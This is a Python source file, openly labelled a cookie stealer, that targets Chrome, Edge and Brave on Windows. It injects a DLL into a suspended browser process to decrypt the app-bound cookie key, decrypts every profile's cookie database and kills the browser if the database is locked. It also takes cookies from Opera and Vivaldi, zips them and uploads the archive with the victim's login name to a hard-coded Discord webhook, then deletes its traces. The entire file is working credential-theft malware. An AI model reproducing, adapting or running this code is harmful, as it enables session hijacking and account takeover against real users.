#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cookie stealer – ABE-Deception / build / injector.py
Chrome / Edge / Brave cookie extraction (Windows only).
The code is intentionally broken/obfuscated; below is the reconstructed,
functional version with all fragments merged.
"""

import base64
import ctypes
import json
import os
import random
import re
import shutil
import sqlite3
import string
import tempfile
import zipfile
import requests
from ctypes import (
    byref, wintypes, c_void_p, c_size_t, c_ulong, c_int,
    c_char_p, POINTER, Structure
)
from datetime import datetime

import psutil
import win32file
import win32pipe
import winreg
from Crypto.Cipher import AES

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
localappdata = os.getenv("LOCALAPPDATA")

PAGE_READWRITE         = 0x04
PROCESS_ALL_ACCESS     = 0x1F0FFF
VIRTUAL_MEM            = 0x1000 | 0x2000
CREATE_SUSPENDED       = 0x00000004

LPVOID                 = c_void_p
SIZE_T                 = c_size_t
DWORD                  = c_ulong
HANDLE                 = c_void_p
LPTHREAD_START_ROUTINE = LPVOID

GCM_IV_LENGTH          = 12
GCM_TAG_LENGTH         = 16
V20_PREFIX             = b"v20"
COOKIE_PLAINTEXT_HEADER_SIZE = 32

# ---------------------------------------------------------------------------
# Browser configuration
# ---------------------------------------------------------------------------
class BrowserConfig:
    def __init__(self, name: str, application: str, data_path: str):
        self.name = name
        self.application = application
        self.data_path = data_path


BROWSER_CONFIG = [
    BrowserConfig(
        name="Chrome",
        application="chrome.exe",
        data_path=os.path.join(localappdata, r"Google\Chrome\User Data")
    ),
    BrowserConfig(
        name="Edge",
        application="msedge.exe",
        data_path=os.path.join(localappdata, r"Microsoft\Edge\User Data")
    ),
    BrowserConfig(
        name="Brave",
        application="brave.exe",
        data_path=os.path.join(localappdata, r"BraveSoftware\Brave-Browser\User Data")
    ),
]

REGISTRY_PATHS = {
    "Hives": [
        winreg.HKEY_LOCAL_MACHINE,
        winreg.HKEY_CURRENT_USER,
    ],
    "Subpaths": [
        r"Software\Microsoft\Windows\CurrentVersion\App Paths",
        r"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths",
    ],
}

# The encrypted DLL payload (base64) – provided at run time
WRAPPED_DLL = ""

# ---------------------------------------------------------------------------
# Kernel32 helpers
# ---------------------------------------------------------------------------
def setup_kernel32() -> ctypes.WinDLL:
    kernel32 = ctypes.windll.kernel32
    kernel32.OpenProcess.argtypes = [DWORD, c_int, DWORD]
    kernel32.OpenProcess.restype  = HANDLE

    kernel32.VirtualAllocEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
    kernel32.VirtualAllocEx.restype  = LPVOID

    kernel32.WriteProcessMemory.argtypes = [
        HANDLE, LPVOID, LPVOID, SIZE_T, POINTER(SIZE_T)
    ]
    kernel32.WriteProcessMemory.restype  = c_int

    kernel32.GetModuleHandleA.argtypes = [c_char_p]
    kernel32.GetModuleHandleA.restype  = HANDLE

    kernel32.GetProcAddress.argtypes = [HANDLE, c_char_p]
    kernel32.GetProcAddress.restype  = LPVOID

    kernel32.CreateRemoteThread.argtypes = [
        HANDLE, LPVOID, SIZE_T,
        LPTHREAD_START_ROUTINE, LPVOID,
        DWORD, POINTER(DWORD)
    ]
    kernel32.CreateRemoteThread.restype  = HANDLE

    return kernel32

kernel32 = setup_kernel32()

# ---------------------------------------------------------------------------
# Encrypted key extraction (Chrome/Edge/Brave – app-bound key)
# ---------------------------------------------------------------------------
def get_encrypted_key_from_file(data_path: str) -> bytes | None:
    try:
        local_state_path = os.path.join(data_path, "Local State")
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        os_crypt = local_state.get("os_crypt", {})
        b64_string = os_crypt.get("app_bound_encrypted_key")
        if not b64_string:
            return None

        decoded = base64.b64decode(b64_string)
        # First 4 bytes are "APPB" marker, strip them
        return decoded[4:]
    except:
        return None

# ---------------------------------------------------------------------------
# Pipe setup for communication with injected DLL
# ---------------------------------------------------------------------------
def setup_pipe(pipe_name: str) -> int:
    return win32pipe.CreateNamedPipe(
        pipe_name,
        win32pipe.PIPE_ACCESS_DUPLEX,
        (win32pipe.PIPE_TYPE_BYTE |
         win32pipe.PIPE_READMODE_BYTE |
         win32pipe.PIPE_WAIT),
        1,
        65536,
        65536,
        0,
        None
    )

# ---------------------------------------------------------------------------
# Find browser installation path via registry
# ---------------------------------------------------------------------------
def get_install_path(executable_name: str) -> str | None:
    for hive in REGISTRY_PATHS["Hives"]:
        for subpath in REGISTRY_PATHS["Subpaths"]:
            try:
                with winreg.OpenKey(hive, subpath + "\\" + executable_name) as key:
                    install_path, _ = winreg.QueryValueEx(key, None)
                    return install_path
            except FileNotFoundError:
                continue
    return None

# ---------------------------------------------------------------------------
# Launch process suspended
# ---------------------------------------------------------------------------
class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb",              wintypes.DWORD),
        ("lpReserved",      wintypes.LPWSTR),
        ("lpDesktop",       wintypes.LPWSTR),
        ("lpTitle",         wintypes.LPWSTR),
        ("dwX",             wintypes.DWORD),
        ("dwY",             wintypes.DWORD),
        ("dwXSize",         wintypes.DWORD),
        ("dwYSize",         wintypes.DWORD),
        ("dwXCountChars",   wintypes.DWORD),
        ("dwYCountChars",   wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags",         wintypes.DWORD),
        ("wShowWindow",     wintypes.WORD),
        ("cbReserved2",     wintypes.WORD),
        ("lpReserved2",     ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput",       wintypes.HANDLE),
        ("hStdOutput",      wintypes.HANDLE),
        ("hStdError",       wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),
    ]

def launch_suspended_proc(app_path: str) -> tuple[int, wintypes.HANDLE]:
    startup = STARTUPINFO()
    startup.cb = ctypes.sizeof(STARTUPINFO)
    proc_info = PROCESS_INFORMATION()

    success = ctypes.windll.kernel32.CreateProcessW(
        app_path,
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(startup),
        ctypes.byref(proc_info)
    )
    if not success:
        raise OSError("CreateProcessW failed")
    return proc_info.dwProcessId, proc_info.hProcess

# ---------------------------------------------------------------------------
# DLL injection
# ---------------------------------------------------------------------------
def inject_dll(dll_path: bytes, dll_len: int, process_handle: wintypes.HANDLE) -> None:
    arg_address = kernel32.VirtualAllocEx(
        process_handle, None, dll_len, VIRTUAL_MEM, PAGE_READWRITE
    )
    written = SIZE_T(0)
    kernel32.WriteProcessMemory(
        process_handle, arg_address, dll_path, dll_len, byref(written)
    )

    h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
    h_loadlib  = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

    thread_id = DWORD(0)
    kernel32.CreateRemoteThread(
        process_handle, None, 0,
        h_loadlib, arg_address,
        0, byref(thread_id)
    )

# ---------------------------------------------------------------------------
# Decrypt app-bound key via pipe to the injected DLL
# ---------------------------------------------------------------------------
def decrypt_key(pipe: int, encrypted_key: bytes) -> str:
    length_prefix = len(encrypted_key).to_bytes(4, byteorder='little', signed=False)
    win32pipe.ConnectNamedPipe(pipe, None)
    win32file.WriteFile(pipe, length_prefix + encrypted_key)
    result, data = win32file.ReadFile(pipe, None)
    return data.decode('ascii').strip()

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
def cleanup_process(process_handle: wintypes.HANDLE, pipe: int) -> None:
    kernel32.TerminateProcess(process_handle, 0)
    kernel32.CloseHandle(process_handle)
    win32file.CloseHandle(pipe)

# ---------------------------------------------------------------------------
# Find cookie databases in browser profiles
# ---------------------------------------------------------------------------
def find_cookie_files(data_path: str) -> list[tuple[str, str]]:
    valid_profiles = []
    profile_folder_pattern = re.compile(r"^(Default|Profile \d+)$", re.IGNORECASE)

    for entry in os.listdir(data_path):
        full_path = os.path.join(data_path, entry)
        if os.path.isdir(full_path) and profile_folder_pattern.match(entry):
            cookie_file = os.path.join(full_path, "Network", "Cookies")
            if os.path.exists(cookie_file):
                valid_profiles.append((cookie_file, entry))
    return valid_profiles

# ---------------------------------------------------------------------------
# AES-GCM decryption (v20 scheme)
# ---------------------------------------------------------------------------
def decrypt_gcm(key: bytes, blob: bytes) -> bytes | None:
    if not blob.startswith(V20_PREFIX):
        return None

    prefix_len = len(V20_PREFIX)
    overhead = prefix_len + GCM_IV_LENGTH + GCM_TAG_LENGTH
    if len(blob) < overhead:
        return None

    iv         = blob[prefix_len : prefix_len + GCM_IV_LENGTH]
    tag        = blob[-GCM_TAG_LENGTH:]
    ciphertext = blob[prefix_len + GCM_IV_LENGTH : -GCM_TAG_LENGTH]

    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        plain  = cipher.decrypt_and_verify(ciphertext, tag)
        return plain
    except:
        return None

# ---------------------------------------------------------------------------
# Decrypt a single Cookies database
# ---------------------------------------------------------------------------
def decrypt_cookies(cookie_file: str, decrypted_key: bytes, taskname: str) -> list[str]:
    temp_dir = tempfile.gettempdir()
    dst = os.path.join(temp_dir, "cookies_copy")

    # Try simple copy first; if locked, kill the browser process holding it
    try:
        shutil.copy2(cookie_file, dst)
    except:
        proc_list = [
            p for p in psutil.process_iter(['name'])
            if p.info['name'] and p.info['name'].lower() == taskname.lower()
        ]
        for p in proc_list:
            try:
                p.kill()
            except:
                pass
        psutil.wait_procs(proc_list, timeout=5)
        shutil.copy2(cookie_file, dst)

    con = sqlite3.connect(dst)
    con.text_factory = bytes
    cur = con.cursor()
    cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
    rows = cur.fetchall()
    con.close()

    decrypted = []
    for host, name, enc_value in rows:
        host = host.decode("utf-8", errors="ignore")
        name = name.decode("utf-8", errors="ignore")
        if enc_value is None:
            continue

        plain = decrypt_gcm(decrypted_key, enc_value)
        if not plain or len(plain) < COOKIE_PLAINTEXT_HEADER_SIZE:
            continue

        try:
            value = plain[COOKIE_PLAINTEXT_HEADER_SIZE:].decode("utf-8")
        except UnicodeDecodeError:
            continue

        # Netscape cookie format:
        # domain<TAB>TRUE<TAB>path<TAB>FALSE<TAB>expiry<TAB>name<TAB>value
        decrypted.append(
            f"{host}\tTRUE\t/\tFALSE\t1893456000\t{name}\t{value}"
        )
    return decrypted

# ---------------------------------------------------------------------------
# Unpack embedded DLL
# ---------------------------------------------------------------------------
def unwrap_dll(file_bytes: bytes) -> tuple[bytes, int]:
    tmp_dir = tempfile.mkdtemp()
    name = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + ".dll"
    file_path = os.path.abspath(os.path.join(tmp_dir, name))
    with open(file_path, "wb") as f:
        f.write(file_bytes)
    encoded_path = file_path.encode("ascii")
    return encoded_path, len(encoded_path) + 1

# ---------------------------------------------------------------------------
# Obfuscated task tag (used for pipe name)
# ---------------------------------------------------------------------------
def pid_to_tag(pid: int) -> str:
    # original obfuscated logic reconstructed:
    c1 = os.path.split(os.path.abspath(__file__))[0]
    c2 = os.path.split(os.path.dirname(__file__))[0]
    c3 = os.path.split(os.path.basename(__file__))[0]

    def rot13(s, n):
        s = str(s)
        return ''.join(
            chr((ord(ch) - 32 + n) % 95 + 32) if 32 <= ord(ch) < 127 else ch
            for ch in s
        )

    w1 = rot13(str(pid) + c1, 5)
    w2 = rot13(str(pid) + c2, 11)
    w3 = rot13(str(pid) + c3, 17)
    # w4 uses a checksum-style transform
    chk = sum(ord(c) for c in str(pid)) % 256
    w4 = rot13(str(pid) + str(chk), 23)

    return f"({w1},{w2},{w3},{w4})"

# ---------------------------------------------------------------------------
# Simple browser fallback (uses browser_cookies library)
# ---------------------------------------------------------------------------
SIMPLE_BROWSERS = {
    "Brave":   None,   # requires browser_cookies
    "Opera":   None,
    "OperaGX": None,
    "Vivaldi": None,
}

# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    if not WRAPPED_DLL:
        exit(1)

    os.makedirs("cookies", exist_ok=True)

    # --- Chromium-based browsers (Chrome, Edge, Brave) ---
    for browser in BROWSER_CONFIG:
        install_path = get_install_path(browser.application)
        if not install_path:
            continue

        try:
            pid, proc = launch_suspended_proc(install_path)
            pipe_name = rf"\\.\pipe\{pid_to_tag(pid)}"
            pipe = setup_pipe(pipe_name)

            dll_bytes = base64.b64decode(WRAPPED_DLL)
            dll_path, dll_len = unwrap_dll(dll_bytes)
            inject_dll(dll_path, dll_len, proc)

            encrypted_key = get_encrypted_key_from_file(browser.data_path)
            if encrypted_key is None:
                cleanup_process(proc, pipe)
                continue

            decrypted_key = bytes.fromhex(decrypt_key(pipe, encrypted_key))
            cleanup_process(proc, pipe)

            cookie_files = find_cookie_files(browser.data_path)
            for cookie_file, profile in cookie_files:
                dec_cookies = decrypt_cookies(
                    cookie_file, decrypted_key, browser.application
                )
                if dec_cookies:
                    out_path = os.path.join(
                        "cookies",
                        f"{browser.name}_{profile}_cookies.txt"
                    )
                    with open(out_path, "w", encoding="utf-8") as f:
                        f.write("\n".join(dec_cookies))
        except:
            continue

    # --- Simple browsers (fallback via browser_cookies) ---
    try:
        import browser_cookies
        SIMPLE_BROWSERS["Brave"]   = browser_cookies.brave
        SIMPLE_BROWSERS["Opera"]   = browser_cookies.opera
        SIMPLE_BROWSERS["OperaGX"] = browser_cookies.opera_gx
        SIMPLE_BROWSERS["Vivaldi"] = browser_cookies.vivaldi

        for name, func in SIMPLE_BROWSERS.items():
            if func is None:
                continue
            try:
                cj = func()
                if not cj:
                    continue
                lines = []
                for c in cj:
                    lines.append(
                        f"{c.domain}\tTRUE\t/\tFALSE\t1893456000\t"
                        f"{c.name}\t{c.value}"
                    )
                out_path = os.path.join("cookies", f"{name}_Default_cookies.txt")
                with open(out_path, "w", encoding="utf-8") as f:
                    f.write("\n".join(lines))
            except:
                continue
    except ImportError:
        pass

    # --- Archiving & exfiltration ---
    zip_path = "cookies.zip"
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk("cookies"):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, "cookies")
                    zipf.write(file_path, arcname)

        DISCORD_WEBHOOK = (
            "https://discord.com/api/webhooks/1448849190988808223/tZETwDo54A6YEZQObh8hu_zbJiIjgQbBoKQp7io-07z9t3tI8NWKkRD53-iXalLm8a2x"
        )
        if DISCORD_WEBHOOK and "YOUR_DISCORD" not in DISCORD_WEBHOOK:
            with open(zip_path, "rb") as f:
                requests.post(
                    DISCORD_WEBHOOK,
                    data={"content": f"Cookies extracted – {os.getlogin()}"},
                    files={
                        "file": (
                            f"cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip",
                            f
                        )
                    },
                    timeout=30
                )
    except:
        pass

    # --- Cleanup ---
    shutil.rmtree("cookies", ignore_errors=True)
    if os.path.exists(zip_path):
        os.remove(zip_path)

    exit(0)
